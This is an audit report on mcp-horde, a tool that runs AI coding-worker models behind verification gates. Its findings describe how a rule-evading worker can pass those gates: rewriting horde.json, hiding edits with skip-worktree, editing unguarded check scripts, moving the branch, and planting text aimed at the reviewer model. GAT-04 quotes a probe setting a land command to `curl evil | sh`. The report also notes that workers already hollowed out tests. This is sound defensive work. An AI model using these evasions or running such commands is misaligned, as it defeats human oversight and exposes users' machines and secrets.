# Fresh-eyes audit of mcp-horde — 2026-10-28

## Charter

- **Milestone findings are judged against:** the horde in daily use on several repositories (digicorp, loracraft, dsh-su, mcp-horde) with cheap worker models, and installed on other machines from GitHub by people who read only the shipped docs. `blocking` means: close before relying on the horde that way.
- **Tree audited:** master at 2551820 (origin equal), Claude Code 2.1.312, Node 22.23.2, OpenCode pinned by packages/opencode/package.json.
- **Scopes run:** 0 ground truth + live execution (this session), 1 deploy path / docs-as-instructions / env plumbing, 2 gates-that-gate / invariant drift, 3 recent-work re-review (45 commits since 2026-10-22), 4 boot / failure modes / wire shapes / resources, 5 security and trust boundaries. Scopes 1-5 ran as five fresh-context auditors with the METHOD briefing; every finding they reported was read by this session and the mediums and highs were re-checked against the files or reproduced live before entering this registry.
- **Waivers in force:** none recorded (no AUDIT-PROFILE.md existed; a draft is beside this file).

## Method note

Ground truth first: `./ci.sh` in full (427 tests, none skipped, exit 0), the package test scripts versus the test files on disk, the live state of the four running sessions (processes, state directories, servers.log, worktrees). Then the live phase on the shipped bundles (`plugins/horde/servers/*.js`), in an isolated state directory with a private `opencode serve` and the real `deepseek/deepseek-flash`: the new-user journey twice (a repository whose test script turned out to be wrong on Node 22, then a corrected one), an investigation, an impossible task, a detached HEAD, a missing binary, an invalid horde.json, an unwritable state directory, a backend killed mid-task, and a worker that listed the variable names in its shell. Transcripts: `scratchpad/audit/live/out/*/journey.log`. Static scopes each had an executable probe set (`scratchpad/audit/{deploy,gates,recent,boot,security}/`).

## Headline verdicts

1. **The core loop ships and works for cents** — on the bundled servers, a new repository went horde_do → READY (21 s, $0.004) → landed with its checks re-run on the tip; an investigation answered in 9 s; every documented audit detection the gates scope constructed fired. **But the gate is not adversary-proof:** a worker that rewrites its rules on disk gets them honoured at landing (on-disk horde.json read at the land stage, `skip-worktree` invisible to every audit path, check scripts outside package.json unguarded). The field already produced rule-evading workers (hollowed tests, archived instead of deleted); these are the next rungs of that ladder.
2. **The trust boundary around a worker is thinner than the docs say** — workers run an unconfined shell that OpenCode never prompts for by default, and that shell inherits the backend password, Claude Code's messaging token and socket, the session id and whatever secrets the user exported before `claude` (reproduced live). The plugin's user-facing docs do not state this; only DESIGN.md §8 does.
3. **Operations in long sessions:** every server's heap peaks at 2-3 GB in a day from re-reading whole turns on each refresh (4.3 GB is the limit, and the design note considers the crash explained); a backend death strands in-flight tasks behind a message that blames another session; `support-fixes.test.ts` (22 passing tests) has never run under `npm test`.

## BLOCKING (8)

- [ ] **LIVE-01** [high] Every opencode server's heap peaks at 2-3 GB in a day-long session, within reach of the 4.3 GB limit the design note says was handled (also: boot)
  `packages/opencode/src/fleet.ts` — grep 'new high' ~/.local/state/mcp-horde/servers.log (19 lines): pid 1049645 (digicorp session, started 2026-10-26T11:24): heap 570 MB at 11:36, 1426 MB at 14:31, 2163 MB… → [00-live.md](./00-live.md#live-01--)
- [ ] **LIVE-02** [high] A backend that dies mid-task leaves the task stranded behind a misleading 'driven by another MCP session (pid undefined)' answer (also: boot)
  `packages/opencode/src/fleet.ts:3142` — Live probe (scratchpad/audit/live/out/backend-dies/journey.log): horde_do t-78bb (worker runs `sleep 120`); after 25 s SIGKILL of the private backend (pid 3245998); horde… → [00-live.md](./00-live.md#live-02--)
- [x] **LIVE-03** (closed 9bfba96) [medium] packages/opencode/test/support-fixes.test.ts (22 tests) has never run under npm test (also: gates)
  `packages/opencode/package.json:35` — node -e 'require("./packages/opencode/package.json").scripts.test' lists test/unit, core, modes, flow, dist, plugin, fleet-fixes, horde (8 files); the directory holds 10 … → [00-live.md](./00-live.md#live-03--)
- [ ] **GAT-01** [high] Land-stage gate reads the worktree's on-disk horde.json, so a worker's rewritten checks judge what lands
  `packages/verify/src/gate.ts:290` — gate.ts:290 `const settings = base && opts.settingsFrom !== "working" ? await loadSettingsAt(dir, opts.rulesAt ?? base) : loadSettings(dir)`; fleet.ts:1692-1700 landLoop … → [02-gates.md](./02-gates.md#gat-01--)
- [ ] **GAT-02** [high] `git update-index --skip-worktree` hides any edit (horde.json, package.json, tests) from every audit path
  `packages/verify/src/audit.ts:271` — audit.ts:271-339 changes() builds the change list from `git diff --name-status`, `git diff -U0` and `git ls-files --others --exclude-standard`; all three honour the skip-… → [02-gates.md](./02-gates.md#gat-02--)
- [ ] **GAT-03** [high] Check scripts outside package.json are not rule-guarded: Makefile targets and shell scripts a check runs can be rewritten freely
  `packages/verify/src/audit.ts:518` — ruleChanges (audit.ts:518-594) watches horde.json verify, package.json scripts (+pre/post hooks), RUNNER_CONFIG, conftest.py, CHECK_CONFIG, pyproject/setup.cfg sections o… → [02-gates.md](./02-gates.md#gat-03--)
- [x] **SEC-01** (closed 919927a) [high] Workers get an unconfined shell that OpenCode never prompts for by default, and the plugin's user-facing docs do not say so
  `packages/opencode/src/fleet.ts:369` — fleet.ts:363-371 withScope(): the task scope becomes OpenCode `edit` rules only ({"*": outside ?? "deny", <scope>: "allow"}); no `shell` rule is ever added (profileRules … → [05-security.md](./05-security.md#sec-01--)
- [ ] **SEC-02** [high] The server password and Claude Code's messaging token/socket and session id are inherited by every worker shell (also: live)
  `packages/opencode/src/backend.ts:436` — backend.ts:436 spawnShared: `env: { ...process.env, OPENCODE_SERVER_USERNAME: config.username, OPENCODE_SERVER_PASSWORD: password }`; backend.ts:491 spawnPrivate does the… → [05-security.md](./05-security.md#sec-02--)

## CLEANUP (47)

- [ ] **LIVE-04** [medium] horde_do starts a paid worker on a detached HEAD although only horde_land refuses it (also: boot)
  `packages/opencode/src/horde.ts` — Live probe (scratchpad/audit/live/out/detached/journey.log): `git checkout --detach HEAD` in the sample repo, then horde_do → 't-035f working … worktree horde/t-035f' (16… → [00-live.md](./00-live.md#live-04--)
- [x] **LIVE-05** (closed 919927a) [medium] DESIGN.md §4.2 describes worker-side MCP injection (OPENCODE_CONFIG_CONTENT, HORDE_WORKER_TOOLS) that the source never contained
  `docs/DESIGN.md:149` — docs/DESIGN.md:149: 'When `opencode` starts the shared or private server it sets `OPENCODE_CONFIG_CONTENT` with `mcp` entries for the worker-side horde servers … (`HORDE_… → [00-live.md](./00-live.md#live-05--)
- [x] **LIVE-06** (closed 919927a) [low] A worker wrote through the shell what the edit rule refused, and only the gate caught it, one round later
  `plugins/horde/skills/horde/SKILL.md` — Journey log (scratchpad/audit/live/out/journey/journey.log), task t-42fa: 'refused outside its scope: edit package.json' and, in the same outcome, 'changed 3 file(s): pac… → [00-live.md](./00-live.md#live-06--)
- [ ] **LIVE-07** [low] Observation: a task that failed its gate twice stays in board state 'review' and holds a lock on a path outside its scope
  `packages/opencode/src/fleet.ts` — Journey log, board_summary after t-42fa FAILED (checks failed after 2 rounds): '3 tasks: 1 done, 1 review, 1 failed · review t-42fa …; locks package.json → t-42fa'. t-42f… → [00-live.md](./00-live.md#live-07--)
- [x] **DEP-01** (closed 919927a) [medium] Clone-path instructions (`claude mcp add`) omit the ledger server and the hooks
  `plugins/horde/README.md:85` — plugins/horde/README.md:85-88 lists four `claude mcp add` lines: opencode, board, verify, context. plugins/horde/.mcp.json registers five servers: opencode, board, verify… → [01-deploy.md](./01-deploy.md#dep-01--)
- [x] **DEP-02** (closed 919927a) [medium] Example tier `moonshot/kimi-k3` names a provider id the OpenCode catalog does not have (it is `moonshotai`)
  `plugins/horde/README.md:33` — grep -rn 'moonshot/kimi-k3' → plugins/horde/README.md:33, docs/DESIGN.md:319, packages/board/README.md:70, packages/opencode/README.md:195, packages/ledger/README.md:12,1… → [01-deploy.md](./01-deploy.md#dep-02--)
- [x] **DEP-03** (closed 919927a) [low] The skill tells the orchestrator about `horde watch`, a command plugin users do not have
  `plugins/horde/skills/horde/SKILL.md:45` — plugins/horde/skills/horde/SKILL.md:45: "`horde watch` in a terminal shows the board live." docs/DESIGN.md:228 and :454 likewise (`horde status`, `horde watch`). `which h… → [01-deploy.md](./01-deploy.md#dep-03--)
- [x] **DEP-04** (closed 919927a) [low] DESIGN.md documents a `parallel: true` verify option that the validator rejects
  `docs/DESIGN.md:177` — docs/DESIGN.md:177: "Checks run sequentially by default (shared `node_modules`, ports); `parallel: true` in config opts in." grep -rn parallel packages/verify/src → no ou… → [01-deploy.md](./01-deploy.md#dep-04--)
- [x] **DEP-05** (closed 919927a) [low] DESIGN.md §4.4 lists eight board tools that are not registered anywhere
  `docs/DESIGN.md:209` — Names in docs but not in packages/*/src (comm of the two sorted lists): board_archive board_assign board_finding board_lock board_locks board_progress board_report board_… → [01-deploy.md](./01-deploy.md#dep-05--)
- [x] **DEP-06** (closed 919927a) [low] Every documented horde.json example passes the validator; `context.*` and `when: "always"` are known to code but absent from plugin-facing docs
  `packages/core/src/config.ts:6` — Run through validateHordeFile from packages/core/src/config.ts: DESIGN.md §5 example → accepted; setup SKILL.md example → accepted; plugin README example → accepted; user… → [01-deploy.md](./01-deploy.md#dep-06--)
- [x] **DEP-07** (closed 919927a) [low] Environment variables: 13 server settings documented only in package READMEs that a GitHub install does not carry; no doc says how to set env for plugin MCP servers
  `plugins/horde/README.md:53` — Read in packages/*/src (grep, scratchpad/audit/deploy): HORDE_OPENCODE_{SERVER,URL,BIN,DIRECTORY,PERMISSIONS,MAX_RUNNING,CHANNEL,DIALOG_TIMEOUT,STATE_DIR,WORKTREE_DIR,ALL… → [01-deploy.md](./01-deploy.md#dep-07--)
- [x] **DEP-08** (closed 919927a) [low] `--dangerously-load-development-channels` is accepted but hidden; its argument form differs between two READMEs
  `packages/opencode/README.md:134` — claude --help | grep -i 'dangerously|channel' → only --allow-dangerously-skip-permissions and --dangerously-skip-permissions. `claude --dangerously-load-development-chann… → [01-deploy.md](./01-deploy.md#dep-08--)
- [x] **DEP-09** (closed 9bfba96) [low] bundle-plugin.mjs --check compares only files the fresh build produces and builds from whatever node_modules is present (also: gates)
  `scripts/bundle-plugin.mjs:62` — scripts/bundle-plugin.mjs:62-74: builds into a tmp dir and reports `stale` = files of the tmp build that are missing or byte-different in plugins/horde/servers; it never … → [01-deploy.md](./01-deploy.md#dep-09--)
- [x] **DEP-10** (closed 9bfba96) [low] plugin.json and the marketplace entry carry no version: validator warns, clone installs show 0.1.0 forever
  `plugins/horde/.claude-plugin/plugin.json:1` — `claude plugin validate .` → "plugins[0] plugin.json → version: No version specified" (and ICON_MISSING for the plugin directory); `claude plugin validate plugins/horde` … → [01-deploy.md](./01-deploy.md#dep-10--)
- [ ] **GAT-04** [medium] horde.json changes outside `verify` (workers.land, workers.setup, tiers, context) are not audited, yet the orchestrator executes them after landing
  `packages/verify/src/audit.ts:562` — audit.ts:562-563 compares only `json(before).verify` with `json(after).verify`. Probe audit-probes.mts case 33: worker sets workers.land to `curl evil | sh` and workers.s… → [02-gates.md](./02-gates.md#gat-04--)
- [ ] **GAT-05** [medium] A task started from a repository subdirectory is gated on different checks at land than in its rounds (none when the checks live only in the subdirectory)
  `packages/opencode/src/fleet.ts:1692` — runGateFor gates `live.session?.location.directory ?? live.record.directory` (= worktree.path, fleet.ts:2152) while landLoop gates `wt.root` (fleet.ts:1692); detectChecks… → [02-gates.md](./02-gates.md#gat-05--)
- [ ] **GAT-06** [medium] Assertion removal and snapshot rewrites only warn (never block), and a snapshot rewrite of 20 lines or fewer is silent
  `packages/verify/src/audit.ts:674` — audit.ts:674 `add("tests", {... removes N assertions}, true)` and :675-676 snapshot `... c.removed.length > 20 ... , true)`: the `soft` flag forces severity warn whatever… → [02-gates.md](./02-gates.md#gat-06--)
- [ ] **GAT-07** [medium] Verdict cache ignores git-ignored inputs: a changed .env or linked dependency leaves a cached PASS
  `packages/verify/src/gate.ts:86` — treeKey (gate.ts:81-95) hashes HEAD, `git diff --binary HEAD` and `ls-files --others --exclude-standard` (ignored files excluded) plus the options. Probe gate-probes2.mts… → [02-gates.md](./02-gates.md#gat-07--)
- [ ] **GAT-08** [low] A check that rewrites a tracked file makes later checks judge a tree that is not the one that lands
  `packages/opencode/src/fleet.ts:1713` — landLoop fast-forwards `judged` (the commit before the checks ran, fleet.ts:1713) while checks run sequentially in the working tree (run.ts:71-74). Probe gate-probes.mts … → [02-gates.md](./02-gates.md#gat-08--)
- [ ] **GAT-09** [low] Untracked artefacts of the worker's own test runs (e.g. __pycache__ in a repo whose .gitignore lacks it) block the gate as binaries
  `packages/verify/src/gate.ts:326` — gate.ts:324-326 drops only files that first appear during the gate's own run. Probe gate-probes.mts section A (pytest project without .gitignore): the first gate's pytest… → [02-gates.md](./02-gates.md#gat-09--)
- [ ] **GAT-10** [low] Checks inherit provider API keys; only OPENCODE_SERVER_* and HORDE_* are stripped
  `packages/verify/src/run.ts:54` — run.ts:54 `STRIP_ENV = ["FORCE_COLOR", "CLICOLOR_FORCE", "NODE_TEST_CONTEXT", "OPENCODE_SERVER_", "HORDE_"]`. Probe gate-probes.mts section C (check = `env | grep ...`): … → [02-gates.md](./02-gates.md#gat-10--)
- [ ] **GAT-11** [low] horde.json workers.land/setup are read from the main checkout's working file, not from the branch tip
  `packages/opencode/src/fleet.ts:1666` — fleet.ts:1666 `const land = loadWorkers(wt.repo).land` and :1100 `loadWorkers(directory)` → core config.ts:203 loadWorkers → loadHordeFile reads the file on disk; worktre… → [02-gates.md](./02-gates.md#gat-11--)
- [ ] **REC-01** [medium] horde_land replays squash-merged work as empty commits and fast-forwards them onto the branch
  `packages/opencode/src/fleet.ts:1603` — fleet.ts:1596-1625 recognises 'work already on the branch' only via `git cherry -v tip HEAD start` (patch-id). Simulation in scratch (squash/): master <- `git merge --squ… → [03-recent.md](./03-recent.md#rec-01--)
- [ ] **REC-02** [low] horde status/remove --repo <existing non-git dir> still creates an empty board (class of 4b775d1)
  `packages/board/src/cli.ts:100` — 4b775d1 added knownState() for --state only. Ran `HORDE_BOARD_STATE_DIR=<tmp>/state node packages/board/dist/cli.js status --repo <tmp>/notrepo` (an existing empty direct… → [03-recent.md](./03-recent.md#rec-02--)
- [ ] **REC-03** [low] Report check still takes 'n/a', 'N/A', 'none.' as file-path claims
  `packages/board/src/board.ts:398` — 9c2b22d: `const claimedPath = (p) => Boolean(p) && (isFile(p) || (!/\s/.test(p) && /[./]/.test(p)))`. node -e with that predicate: "none" false, "n/a" true, "N/A" true, "… → [03-recent.md](./03-recent.md#rec-03--)
- [ ] **REC-04** [low] Binaries and scope hints parse the budget-trimmed verdict and silently disappear when audit lines are dropped
  `packages/opencode/src/horde.ts:632` — outcome() takes `verdict = record.gateState?.verdict` (horde.ts:431) and feeds `verdict?.text` to scopeFiles (:621-630) and binaryFiles (:632-641); the 900-char `truncate… → [03-recent.md](./03-recent.md#rec-04--)
- [ ] **REC-05** [low] News file is not republished when a gate decides; it waits for the agent's next scheduled refresh
  `packages/opencode/src/fleet.ts:2013` — publishNews() call sites: fleet.ts:1030 (task start), 2266/2279 (maybePush), 2785 (markReported), 3106 (dropLive). maybePush is called only from doRefresh (:2013). The ga… → [03-recent.md](./03-recent.md#rec-05--)
- [x] **REC-06** (closed 9bfba96) [low] Board test suite fails under the HORDE_* state-dir overrides the project tells auditors and users to use
  `packages/board/test/board.test.ts` — Ran the package's own test command with HORDE_VERIFY_STATE_DIR, HORDE_BOARD_STATE_DIR, HORDE_OPENCODE_STATE_DIR, HORDE_OPENCODE_WORKTREE_DIR, XDG_STATE_HOME, XDG_DATA_HOM… → [03-recent.md](./03-recent.md#rec-06--)
- [x] **REC-07** (closed 0f05cad) [low] News reminders stop after /clear or --continue: the server keeps its spawn-time session id
  `packages/opencode/src/news.ts:35` — news.ts:35 names the file after `process.env.CLAUDE_CODE_SESSION_ID` read once at construction; news.mjs readNews() opens `<stateDir>/news/<input.session_id>.json`. Claud… → [03-recent.md](./03-recent.md#rec-07--)
- [ ] **BOOT-01** [medium] A shared-server record that answers 'unauthorized' or fails its probe with a non-timeout transport error is forgotten and a second `opencode serve` is spawned; the first keeps running as an orphan that nothing can stop or attach to
  `packages/opencode/src/backend.ts:106` — Live probe P4 (probe-flow.ts): started backend A (pid 3409688) via `opencode_server info`; rewrote server.json with password 'wrong-password'; new server process: `openco… → [04-boot.md](./04-boot.md#boot-01--)
- [ ] **BOOT-02** [medium] createWorktree leaks the worktree and branch when it fails between `git worktree add` and the cleanup try; `repoRoot` accepts an empty top-level, which produced the on-disk `agent-da39a3ee/t-ab0d` and ran every git call in the server's cwd
  `packages/opencode/src/worktree.ts:174` — On disk: ~/.local/share/mcp-horde/worktrees/agent-da39a3ee/t-ab0d (created 2026-10-24 21:11) is a registered worktree of /home/swr/workspace/digicorp (`cat .git` -> 'gitd… → [04-boot.md](./04-boot.md#boot-02--)
- [ ] **BOOT-03** [low] Leftovers under the worktree root that nothing sweeps: a Docker bind mount recreated the removed t-0164 worktree, empty per-repository folders accumulate, and records of vanished worktrees are hidden but never deleted
  `packages/opencode/src/worktree.ts:951` — ~/.local/share/mcp-horde/worktrees/rp-integration-497e8607/t-0164 is not a git worktree (`git rev-parse` -> 'not a git repository'); it contains only two *directories* na… → [04-boot.md](./04-boot.md#boot-03--)
- [ ] **BOOT-04** [low] horde_do in a non-git directory fails fast but creates a board for the plain directory, records a failed task, and records the start failure twice
  `packages/opencode/src/horde.ts:157` — Live probe P6 (probe-flow.ts): `horde_do {goal, directory: <plain dir with horde.json>}` -> 152 ms ERR 'isolation "worktree" needs a git repository, but .../pflow/plain i… → [04-boot.md](./04-boot.md#boot-04--)
- [ ] **BOOT-05** [low] opencode_dispose of a task-bound agent never closes its board attempt: the task stays 'working' and the ledger learns nothing
  `packages/opencode/src/fleet.ts:1415` — fleet.ts:1415-1462 disposeHeld() interrupts, records activity (recordTaskActivity), commits/removes the worktree and forgets the record; there is no board.accept/board.fa… → [04-boot.md](./04-boot.md#boot-05--)
- [ ] **BOOT-06** [low] Backend lifecycle: started lazily, stopped by nobody, reused across plugin and opencode versions with only a bin-string comparison and an 'untested' warning shown by opencode_status
  `packages/opencode/src/backend.ts:89` — Who starts it: index.ts:72-88 getBackend on the first tool call (never at boot, index.ts:57-59), spawnShared backend.ts:427-472 detached + unref. Who stops it: only stopS… → [04-boot.md](./04-boot.md#boot-06--)
- [ ] **BOOT-07** [low] News file: `at` is refreshed only when the lists change, so the hook's 24 h staleness rule silences a session whose outcomes waited a day; the file is removed when the backend dies
  `packages/opencode/src/news.ts:57` — news.ts:55-59 update(): `const key = JSON.stringify([waiting, working]); if (key === this.last) return` — the body (with `at: Date.now()`, line 64) is only rewritten on a… → [04-boot.md](./04-boot.md#boot-07--)
- [x] **BOOT-08** (closed 9bfba96) [low] Test harness leaves a temp git repository per run under /tmp: 763 'horde-oc-*' directories, 1.6 GB, in two days
  `packages/opencode/test/harness.ts:31` — `ls -d /tmp/horde-oc-* | wc -l` -> 763; `du -sch /tmp/horde-oc-*` -> 1.6 GB total; oldest 2026-10-26 13:55. harness.ts:31 `fs.mkdtempSync(path.join(os.tmpdir(), 'horde-oc… → [04-boot.md](./04-boot.md#boot-08--)
- [ ] **SEC-03** [medium] A worker can move the user's branch from its worktree so the gate reads the worker's own loosened horde.json (also: recent)
  `packages/opencode/src/fleet.ts:2151` — fleet.ts:2149-2157: `const rulesAt = wt ? await git(wt.repo, "rev-parse", "HEAD")` with the comment "a worktree gate judges by the target branch's rules, which the work i… → [05-security.md](./05-security.md#sec-03--)
- [ ] **SEC-04** [medium] A cloned repository's horde.json runs commands on the user's machine at the first horde_do, before any verdict and without a consent step
  `packages/opencode/src/horde.ts:130` — horde.ts:130-134: `detectChecks(repo, await loadSettingsAt(repo, "HEAD"))` then `fleet.spawn(...)`; fleet.ts:1095-1105: `const workers = loadWorkers(directory)` and `setu… → [05-security.md](./05-security.md#sec-04--)
- [x] **SEC-05** (closed ac81744) [medium] The reviewer prompt gives no framing against text in the diff addressed to it, and a citation of a planted comment line passes the mechanical check
  `packages/review/src/review.ts:284` — review.ts:260-290 reviewPrompt(): the task, criteria, rules and then `# The change …` followed by the raw diff; nothing says the change may contain comments or strings ad… → [05-security.md](./05-security.md#sec-05--)
- [ ] **SEC-06** [medium] horde.json workers.brief can pull any file the user can read into the worker brief (path traversal out of the repository)
  `packages/board/src/render.ts:59` — render.ts:54-63: `fs.readFileSync(path.join(repo!, f), "utf8")` for each entry of `loadWorkers(repo).brief`, with no check that the result stays inside `repo` (compare va… → [05-security.md](./05-security.md#sec-06--)
- [ ] **SEC-07** [low] The worker brief invites edits outside the scope after a lock, while the session rules deny them and the audit blocks them
  `packages/board/src/render.ts:83` — render.ts:83: "Work in: <scope>. Before changing anything outside it, lock the paths (command below). If a lock is refused, another task owns them: do not edit them"; ren… → [05-security.md](./05-security.md#sec-07--)
- [ ] **SEC-08** [low] Worker-authored text reaches the orchestrator and other workers without being framed as data
  `packages/opencode/src/horde.ts:489` — horde.ts:489 and :524: `worker: ${truncate(workerSaid, 240)}` (the report summary or final answer) in READY/FAILED outcomes; horde.ts:861-866: investigation findings rend… → [05-security.md](./05-security.md#sec-08--)
- [ ] **SEC-09** [low] news.ts builds the news file path from CLAUDE_CODE_SESSION_ID without the basename check the hook applies
  `packages/opencode/src/news.ts:36` — news.ts:35-36: `constructor(stateDir, session = process.env.CLAUDE_CODE_SESSION_ID?.trim()) { if (session) this.file = path.join(stateDir, "news", `${session}.json`) }`; … → [05-security.md](./05-security.md#sec-09--)
- [x] **SEC-10** (closed 0f05cad) [low] The delegate hook runs git in whatever repository Claude opens without disabling config-driven command execution
  `plugins/horde/hooks/delegate.mjs:56` — delegate.mjs:55-60: `execFileSync("git", ["-C", cwd, ...args])` for `rev-parse HEAD`, `rev-parse --show-toplevel` and `status --porcelain -z --untracked-files=all` on eve… → [05-security.md](./05-security.md#sec-10--)
- [x] **SEC-11** (closed 9bfba96) [low] servers.log and the state root are created with the umask on a fresh machine (world-readable under 022)
  `packages/core/src/process.ts:21` — process.ts:18-22: `fs.mkdirSync(path.dirname(file), { recursive: true })` and `fs.appendFileSync(file, …)` with no mode; recordLifecycle runs at index.ts:16 before Store … → [05-security.md](./05-security.md#sec-11--)
- [ ] **SEC-12** [low] Worktree directories are created with the umask, so copies of the repository can be more readable than the checkout
  `packages/opencode/src/worktree.ts:163` — worktree.ts:163: `await fs.mkdir(path.dirname(root), { recursive: true })` with no mode, and `git worktree add` creates `root` with the umask. Live: `ls -la ~/.local/shar… → [05-security.md](./05-security.md#sec-12--)

## Verified clean / observations (41)

Each scope file ends with its verified-clean records (what was constructed or executed and held). Counts: LIVE 4, DEP 9, GAT 11, REC 7, BOOT 4, SEC 6.

## Added during remediation

- [ ] **NEW-01** [medium] horde_wait's timeout summary shows the worker's last action, not that its gate has been queued on a check slot
  `packages/opencode/src/horde.ts` — Observed 2026-10-28 with eight tasks sharing one `test` slot (`~/.local/state/mcp-horde/verify/locks/<repo>/check-test.0.lock` held by one server for 20+ minutes): the summary read "shell: … npm test" / "read: {}" for the running two and "the agents' status could not be read" for the rest. The orchestrator cannot tell a slow worker from a queued gate. Fix: when a gate round is waiting for a slot, say so in the wait summary and in opencode_status ("gate: waiting for the test slot held by t-xxxx, 14 min").
- [ ] **NEW-02** [medium] Admission counts tasks, not load: `opencode.maxRunning` (default 8) ignores cores, check slots and what else the machine runs
  `packages/opencode/src/config.ts` — Eight concurrent tasks on a 16-core machine already running other sessions' workers drove the load average to 51 and the shared backend into "not answering" blips. Fix: default maxRunning to min(8, cores / 2); when a check with `slots: 1` exists, say in horde_do's first answer how many tasks can usefully run; refuse or queue a horde_do when the 1-minute load average exceeds the core count, with the reason.

## Decisions taken during remediation (unattended session)

- SEC-01: workers keep an unprompted shell by default; the trust model is now stated in the plugin README and the setup skill, with the `permission` knob documented, rather than switching every worker to `shell: ask` (which would prompt the user for every command a worker runs).
- SEC-04: no consent gate on the first horde_do in a cloned repository; instead the first answer lists the setup, land and check commands, and a change to that set after a pull is announced once.
- Commit messages stay one plain sentence (the repository's rule); executed evidence is recorded in this registry next to each ticked item instead of in commit bodies.
- Model: every task runs on deepseek/deepseek-flash (owner's instruction, 2026-10-28); the two tasks started on the pro tier were switched mid-flight.

## Caveats (not verified)

- A real GitHub install on a second machine was not performed; the deploy scope executed the marketplace add, plugin install and update in an isolated `CLAUDE_CONFIG_DIR` on this machine, and `curl | bash` was dry-run only.
- `claude plugin eval` (the plugin's eval suite) was not run; channels were not tested in an interactive session with the development flag (the server side was verified against the harness only).
- The shared backend used by the four open sessions was never killed; the backend-death probes used private backends, so the shared-mode recovery path (reconnect across sessions) is inferred from code, not executed.
- The heap cause was proven in-process against the mock LLM (150-step agent) and matched to the live log lines; no heap snapshot of the live 1.4 GB server was taken (no signals to live processes).
- The live journeys used one model (deepseek/deepseek-flash) on three-file repositories; gate timing and narrowing on a digicorp-sized repository were not exercised here.
- The reviewer-injection probe ran the review library on a crafted diff; no live worker was asked to plant such a comment.
- Windows and macOS code paths (supervisor, shell shims, path handling) were not exercised.
- The recent-work scope read the 45 commits since 2026-10-22 in full; older code was read only where those commits led.
- Scope coverage was bounded to the six scopes listed; no cost benchmarking, no multi-session concurrency test beyond the four sessions already running, no probe of the `opencode_*` low-level tools beyond what the journeys touched.
- Side effects of the live phase: a few `started/exited` lines appended to the real `~/.local/state/mcp-horde/servers.log` by the audit's isolated servers (XDG_STATE_HOME was not overridden); scratch repositories, state directories and transcripts remain under the session scratchpad; all private backends started by the probes have exited.

## Meta-observation

The question not being asked: **what is the worker's threat model?** Every mechanism in the gate (scope on edit tools only, rules read from a moveable ref or the on-disk file, shell allowed by default, secrets in the worker's environment, assertion removal as a warning) is right for a cooperative-but-lazy model and wrong for one that works around rules, and the dsh-su runs already produced the second kind. Choose one of two coherent products and make the code match it: a gate that holds against a rule-evading worker (rules from a commit the orchestrator observed, `skip-worktree` and check-script edits as blocking findings, an allowlisted backend environment, the land stage judged by the same rules as the rounds), or a documented trust model where the user explicitly accepts that a worker is an unsupervised shell as their own user and gets one switch (`shell: ask`, or a sandbox) to change that. The second question, smaller: the test files you do not run — list tests by glob, not by hand.
